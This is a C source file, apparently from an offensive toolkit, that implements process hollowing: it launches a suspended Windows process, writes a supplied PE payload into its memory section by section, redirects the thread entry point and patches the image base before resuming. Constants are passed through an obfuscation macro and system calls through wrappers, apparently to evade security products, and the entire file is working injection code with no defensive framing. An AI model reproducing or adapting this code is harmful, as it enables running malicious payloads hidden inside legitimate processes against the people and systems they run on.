#include "inject.h"

#include "ntddk.h"
#include "common.h"
#include "obfuscateu.h"

#define CHECK_STATUS_AND_CLEANUP(status) { if(!NT_SUCCESS(status)) { UtTerminateProcess(pi.hProcess, 0); return INVALID_HANDLE_VALUE; } }

HANDLE process_hollowing(wchar_t* programPath, wchar_t* cmdLine, wchar_t* runtimeData, BYTE* payloadBuf, wchar_t* startDir)
{
    PROCESS_INFORMATION pi = create_new_process_internal(programPath, cmdLine, startDir, runtimeData, 0, AYU_OBFC(THREAD_CREATE_FLAGS_CREATE_SUSPENDED));
    if (pi.hProcess == INVALID_HANDLE_VALUE) return INVALID_HANDLE_VALUE;

    PIMAGE_NT_HEADERS NtHeader = (PIMAGE_NT_HEADERS)(payloadBuf + ((PIMAGE_DOS_HEADER)payloadBuf)->e_lfanew);

    PVOID BaseAddress = (PVOID)NtHeader->OptionalHeader.ImageBase;
    SIZE_T ViewSize = NtHeader->OptionalHeader.SizeOfImage;
    CHECK_STATUS_AND_CLEANUP(UtAllocateVirtualMemory(pi.hProcess, &BaseAddress, 0, &ViewSize, AYU_OBFC(MEM_RESERVE) | AYU_OBFC(MEM_COMMIT), AYU_OBFC(PAGE_READWRITE)));

    UtWriteVirtualMemory(pi.hProcess, BaseAddress, payloadBuf, NtHeader->OptionalHeader.SizeOfHeaders, NULL);

    PIMAGE_SECTION_HEADER SectionHeader = (PIMAGE_SECTION_HEADER)((BYTE*)NtHeader + AYU_OBFC(sizeof(IMAGE_NT_HEADERS)));

    for (int i = 0; i < NtHeader->FileHeader.NumberOfSections; i++, SectionHeader++) {
        ULONG protectionFlags = SectionHeader->Characteristics & AYU_OBFC(IMAGE_SCN_MEM_EXECUTE) ? (SectionHeader->Characteristics & AYU_OBFC(IMAGE_SCN_MEM_WRITE) ? AYU_OBFC(PAGE_EXECUTE_READWRITE) : AYU_OBFC(PAGE_EXECUTE_READ)) : (SectionHeader->Characteristics & AYU_OBFC(IMAGE_SCN_MEM_WRITE) ? AYU_OBFC(PAGE_READWRITE) : AYU_OBFC(PAGE_READONLY));

        UtWriteVirtualMemory(pi.hProcess, (PBYTE)BaseAddress + SectionHeader->VirtualAddress, payloadBuf + SectionHeader->PointerToRawData, SectionHeader->SizeOfRawData, NULL);

        if (protectionFlags != AYU_OBFC(PAGE_READWRITE)) {
            PVOID sectionBase = (PBYTE)BaseAddress + SectionHeader->VirtualAddress;
            SIZE_T sectionSize = SectionHeader->Misc.VirtualSize;
            ULONG oldProtect;
            UtProtectVirtualMemory(pi.hProcess, &sectionBase, &sectionSize, protectionFlags, &oldProtect);
        }
    }

    CONTEXT context = { };
    context.ContextFlags = AYU_OBFC(CONTEXT_INTEGER);
    CHECK_STATUS_AND_CLEANUP(UtGetContextThread(pi.hThread, &context));

    context.Rcx = (ULONGLONG)BaseAddress + NtHeader->OptionalHeader.AddressOfEntryPoint;
    CHECK_STATUS_AND_CLEANUP(UtSetContextThread(pi.hThread, &context));

    CHECK_STATUS_AND_CLEANUP(UtWriteVirtualMemory(pi.hProcess, (LPVOID)(context.Rdx + (ULONGLONG)(AYU_OBFC(sizeof(ULONGLONG) * 2))), &BaseAddress, AYU_OBFC(sizeof(ULONGLONG)), NULL));

    UtResumeThread(pi.hThread, NULL);
    UtClose(pi.hThread);
    return pi.hProcess;
}